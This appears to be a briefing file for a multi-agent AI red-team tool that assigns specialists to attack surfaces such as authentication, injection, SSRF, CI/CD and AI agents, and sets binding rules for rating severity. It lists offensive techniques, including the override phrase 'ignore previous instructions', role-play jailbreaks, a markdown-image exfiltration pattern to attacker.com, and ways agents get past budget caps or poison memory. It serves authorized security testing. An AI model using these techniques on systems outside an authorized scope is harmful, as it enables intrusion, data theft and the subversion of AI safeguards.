# Agent briefs: specialists

One file, all 16 specialists + 1 auxiliary (baseline-compare). Read the shared template once (especially the **Severity + NOVEL calibration** block — it's binding on every finding), then jump to your block.

## Shared template (applies to every specialist)

**Your role:** attack ONE surface of the target. Produce exploits, not warnings. Specialists trade shallow breadth for deep depth on their surface.

**Inputs:**
- `target.yaml` — provenance, scope (stay inside `scope.in`), authorization.
- `agents/recon/` — surface map + fingerprint. Read first.
- `intake/` — source tree, URLs, specs, prior red-team report, whatever the user supplied.
- **Read other agents' `findings.json`** before finalizing yours. If another specialist has already written up a bug you were about to report, reference their finding ID in `attack_chain` and add YOUR lens' impact to your `notes.md` — don't emit a duplicate per §2 below.

**Outputs:**
- `agents/<your-id>/findings.json` — per schema (see [targets/README.md](../targets/README.md)). Lint with `tools/validate_finding.py`.
- `agents/<your-id>/notes.md` — hypotheses, dead-ends, novel techniques, lens-specific consequences of other agents' findings.
- PoCs, scripts under `evidence/`. Prefix filenames with `<your-id>-` to avoid collisions.

---

## Severity + NOVEL calibration (BINDING on every finding — post-trial-#1 review, 2026-04-20)

**§1 — CRITICAL reserve.** Assign `severity: "CRITICAL"` ONLY when ALL THREE hold:
1. **Exploitable TODAY** with code as written — not "if a future fetch sink is added," not "if env var Y is unset."
2. **Unauth or single-session attacker** — no phishing chain, no insider assumption, no pre-acquired OAuth tokens required.
3. **Direct impact** — data exfiltration, code execution, privilege escalation, or autonomous action against third-party systems (publishing / emailing / paying).
Missing any single criterion → **HIGH** at best. When in doubt, HIGH.

**§2 — Dedupe across specialists.** Same root-cause code defect = ONE primary finding. Don't emit a second CRITICAL because you hit the same bug from a different lens. Read other agents' `findings.json` first; if the bug is already reported, reference their id in `attack_chain` and add your lens-specific impact to your `notes.md`. The cross-agent chains section + dedup-cluster analysis in `report.md` surface the multi-lens view for the user.

**§3 — `novel_pattern: true` tightening.** Mark NOVEL ONLY when:
1. The finding describes a **generalizable pattern** worth becoming a detector rule (env-presence-as-auth, dual-channel-plaintext-rendered-as-html, caller-hint-as-authoritative-tenant), OR
2. The finding describes a **multi-step chain single-pass SAST cannot catch**.
Standard bugs (missing `.dockerignore`, hardcoded API key, cookie-not-HttpOnly, unpinned base image, build-arg literal) are NOT novel — they're textbook.

**§4 — New required fields:**
- `exploitable_now: true | false` — attacker hits this with the code exactly as it exists in the repo today?
- `requires_future_change: "<one-sentence description>" | null` — what code change would be needed to turn a latent precondition-aligned finding into a live exploit. `null` when already exploitable.
- `reproduction_status: "verified" | "code-path-traced" | "theoretical"` — default `code-path-traced` for static review. Don't write code-path-traced as verified.
- `root_cause_confidence: "high" | "medium" | "low"` — did you trace full causation or infer from partial evidence?

**§5 — No speculative chain-primitive inflation.** When describing chained impact, explicitly list the gates between current state and full exploitation. Score severity on the weakest ACTUALLY-PRESENT link. Use "if a future change introduces X, this becomes..." — NOT "attacker obtains..."

**§6 — Latent / defense-in-depth findings route to Hardening Recommendations.** If `exploitable_now: false`, `tools/synthesize.py` places the finding in the Hardening Recommendations section automatically. Severity on those findings should be calibrated against the posture scale, not the exploit scale — usually LOW or MEDIUM.

**Budget:** time-box aggressively. Dig where recon highlighted your surface; skip where recon is cold unless you can justify it.

---

## Web application specialists

### `auth-session` — authn, session, OAuth, JWT
- Focus: login flows, session management, OAuth/OIDC state, JWT validation, MFA, password reset, remember-me, session fixation/rotation, cookie flags, logout invalidation, CSRF token handling.
- Techniques: alg=none/weak-secret/kid-confusion JWT forgery, session non-invalidation after logout, OAuth state/nonce mishandling, password-reset token replay, account takeover via primary-email swap.
- Pattern to watch: `env && !cookie` fail-open guards (REDFORGE MCP-001 / NEXTJS-004 class). Any new flavor → `novel_pattern: true`.

### `authz-idor` — broken access control
- Focus: IDOR, horizontal/vertical privilege escalation, mass assignment, missing ownership checks, role-swap via hidden request fields.
- Techniques: enumerate numeric/UUID IDs; swap victim's UUID; POST/PUT fields the client doesn't normally send (`is_admin`, `role`, `org_id`); tenant isolation probe at every layer.
- Pattern to watch: any mutating handler without an auth marker; any caller-hint header (`X-Tenant-*`, `X-Org-*`) honored as authoritative.

### `injection` — code/query injection
- Focus: SQL, NoSQL, LDAP, XPath, OS command, template (SSTI), server-side, deserialization, XXE.
- Techniques: payload fuzzing with context-aware polyglots, time-based SQLi, ORM-layer bypass via raw queries, template probes (`{{7*7}}`, `${7*7}`), pickle/YAML/Java deserialization.
- Pattern to watch: any path where user input concatenates into a sink without parameterization.

### `ssrf-network` — server-side request forgery + internal pivots
- Focus: SSRF via user-supplied URLs, cloud metadata abuse (169.254.169.254), DNS rebinding, internal-network reach, blind SSRF via OOB callbacks.
- Techniques: `localhost`, IPv6 loopback, `file://`, `gopher://`, redirect chains to internal targets, URL-parser confusion (userinfo@host), metadata service IMDSv1 fallback.
- Pattern to watch: webhook receivers, URL-fetch features, image proxies, PDF renderers, LLM tools that fetch URLs based on model output (chains with `prompt-injection`).
- **Note (§5):** if no current fetch sink is attacker-controlled, the full metadata-pivot chain is LATENT — mark `exploitable_now: false` and route to Hardening via `requires_future_change`.

### `xss-client` — client-side injection
- Focus: reflected/stored/DOM XSS, CSRF, clickjacking, prototype pollution, postMessage abuse, CSP bypass.
- Techniques: attribute breakout, JS-context injection, DOM sinks (`innerHTML`, `eval`, `setTimeout` string form, `document.write`), markdown→HTML paths, polyglots.
- Pattern to watch: `dangerouslySetInnerHTML` with any interpolated value, UGC rendering, markdown-to-HTML without DOMPurify.

### `file-handling` — upload, extract, parse
- Focus: upload validation, path traversal, zip-slip, tar-extract, polyglot content, deserialization-via-file, image/PDF parser CVEs.
- Techniques: magic-byte spoof, double extensions, null-byte, symlink races, archive-escape (`../` in entry names), oversize DoS.
- Pattern to watch: any upload endpoint, temp-file handling, ImageMagick/ffmpeg/PDF pipelines.

### `business-logic` — semantic bugs
- Focus: race conditions (TOCTOU), workflow bypass, pricing/coupon/quota manipulation, rate-limit gaps, replay, idempotency gaps.
- Techniques: fire 100 parallel requests to race ownership checks; step-skip multi-stage flows; negative numbers, integer overflow, signed/unsigned confusion; coupon stacking; replay signed operations.
- Pattern to watch: cosmetic rate-limit headers not wired to enforcement; state machines whose guards are not atomic.

### `api-surface` — REST/GraphQL abuse
- Focus: REST/GraphQL abuse, mass assignment, batching attacks, debug/admin endpoints, over-fetching, introspection.
- Techniques: version enumeration (`/v1/`, `/v2/`, `/internal/`, `/debug/`), HTTP method tampering, content-type confusion, GraphQL alias flooding, depth DoS, introspection on prod.
- Pattern to watch: OpenAPI spec vs actually-exposed routes — often diverges. Hidden admin/ops/health endpoints that leak config.

---

## AI / agentic specialists

### `prompt-injection` — direct + indirect
- Focus: direct prompt injection from user input; indirect via tool output, RAG-retrieved docs, scraped pages, filesystem reads, email bodies; jailbreaks; instruction-hierarchy abuse.
- Techniques: classic "ignore previous instructions", role-play jailbreaks, delimiter confusion with system-prompt mimicry, markdown-image-URL exfil (`![x](attacker.com/?leak=...)`), poisoned document seeded with instructions, tool-response injection.
- Pattern to watch: any LLM that consumes *any* content produced outside the trust boundary.

### `mcp-tool-abuse` — MCP gateway + tool surface
- Focus: over-scoped tool permissions, tool-name/schema confusion, result-trust chains, allowlist bypass, rug-pull tools, gateway auth itself.
- Techniques: pretext-task tool invocation; args that exfil via URL; shadow a legitimate tool name; probe gateway for `if not api_keys` fail-open (MCP-001 class).
- Pattern to watch: gateway `if not api_keys:` — REDFORGE already ships MCP-001.

### `agent-autonomy` — unauthorized action + goal drift
- Focus: unauthorized action initiation, budget/loop exhaustion, goal-drift, scope expansion beyond declared, persistence across sessions, confused-deputy via tool-chain, unbounded tool-call loops.
- Techniques: nested task delegation to bypass per-task budget caps; prompt-injected self-modification; persistent-memory poisoning; cross-session message planting.
- Pattern to watch: agents with broad tool authority; scheduled/cron-triggered agents; autonomous publish/email/pay with no human-in-loop.

### `llm-output-trust` — downstream confused-deputy
- Focus: LLM output consumed downstream without sanitization — XSS/SSRF/command/SQL/template injection via model-generated strings.
- Techniques: prompt-inject the LLM to emit `<script>`, shell metacharacters, SQL, `{{...}}` template syntax — then verify downstream renders/executes it.
- Pattern to watch: LLM output feeding HTML templates, command builders, SQL query builders, file paths, URL parameters. "Plaintext → `\n→<br>` shim → HTML" is a generalizable pattern.

---

## Infra / supply-chain specialists

### `secrets-hunt` — leaked + exposed credentials
- Focus: hardcoded secrets, env leakage, config exposure, client-side secret references, `.well-known` exposure, git-history secrets (if local clone), bundled JS / sourcemap leaks.
- Techniques: grep high-entropy strings, regex known-issuer patterns, check `NEXT_PUBLIC_*` against vendor-safe list, scan sourcemaps.
- Pattern to watch: `if (process.env.X_TOKEN)` as auth gate — when X_TOKEN unset, endpoint fails open (env-presence-as-auth, the F-0001 family).

### `ci-cd` — pipeline weaponization
- Focus: workflow permissions, runner abuse, artifact tampering, poisoned caches, tag/branch protection gaps, PR-gated secret leakage, deploy-step IAM.
- Techniques: malicious PR → `pull_request_target` with secrets in scope; unpinned actions; self-hosted runner arbitrary-code; tag-rewrite for signed artifacts; Cloud Run `--allow-unauthenticated` on internal services.
- Pattern to watch: negative-space rules (missing `serviceAccount:`, missing `.dockerignore`, missing `permissions:`).

### `container-infra` — Docker / K8s / IAM
- Focus: Dockerfile issues (root user, `ADD` from URL, build-arg secrets, `COPY . .` with missing `.dockerignore`), runtime capabilities, K8s RBAC, cloud IAM (over-permissive roles, AssumeRole chains), SSRF→metadata→IAM.
- Techniques: capability review, `privileged: true`, `hostPath`, `hostNetwork`, cross-account role-chain mapping, IAM policy wildcard hunting.
- Pattern to watch: default Compute Engine SA = roles/editor with no explicit `--service-account` → blast-radius amplifier for any SSRF/RCE.

### `dependency-supply` — package-level supply chain
- Focus: typosquatting/confusion, malicious transitive deps, unpinned versions, lock-file integrity, registry-override (dependency confusion), install-script attacks.
- Techniques: dep-tree diff vs popular packages; homoglyph/typo check; `postinstall` script inspection; dependency-confusion for scoped names; lock/manifest drift.
- Pattern to watch: obscure-publisher transitive with install-script inside a popular toolchain (Next.js, Vite, etc.).

---

## Auxiliary

### `baseline-compare` — diff vs prior red-team report
- Focus: compare this trial's findings against the prior red-team report the user supplies in `intake/`.
- Inputs:
  - `intake/prior-report.<pdf|md|json|txt>` (or anything prefixed `prior-` / `baseline-`).
  - `report.md` produced by synthesize.py.
- Outputs: `agents/baseline-compare/notes.md` with:
  - **Matched findings** — what both reports identified (map by surface + file:line when possible).
  - **Unique to mine** — findings I identified that the prior report missed.
  - **Unique to theirs** — findings the prior caught that I missed. (Learning signal.)
  - **Severity disagreements** — same finding, different severity. Calibrated explanation per §1.
  - **Methodology gaps** — attack surface the prior report covered that my roster didn't touch.
- Runs: **after** synthesizer. Reads the tool-produced `report.md`.
- **Why it matters:** user hands over the last red-team report with each target so I can learn what I missed. This agent institutionalizes that compare-and-improve loop.
- **Calibration note:** prior scanners typically score on regex match (HIGH regardless of exploitability). My §1 scale is different. When comparing, don't say "prior over-rated" or "I under-rated" — state the scale difference explicitly.
